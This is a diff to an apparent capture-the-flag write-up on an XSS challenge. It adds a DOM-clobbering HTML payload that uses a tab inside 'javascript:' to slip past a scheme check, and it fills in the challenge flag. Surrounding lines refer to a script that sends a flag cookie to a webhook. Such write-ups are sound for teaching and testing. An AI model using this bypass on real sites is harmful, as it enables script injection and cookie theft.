@@ -179,6 +179,10 @@ location.href = theme.redirect  →  anchor2.toString()  →  "..."
                                                    Browser navigates ✓
 ```
 
+```html
+<a id=THEME></a><a id=THEME name=redirect href="java	script:alert(1)"></a>
+```
+
 ![XSS alert triggered via DOM Clobbering + tab bypass](/img/dexnote-alert.png)
 
 ### Step 2: Bypassing SpatterGuard's Scheme Check
@@ -266,6 +270,6 @@ print(f"\nCheck {WEBHOOK} for the flag cookie!")
 ## Flag
 
 ```
-CATF{...}
+CATF{t0n1ght_15_th3_n1ght}
 ```
 
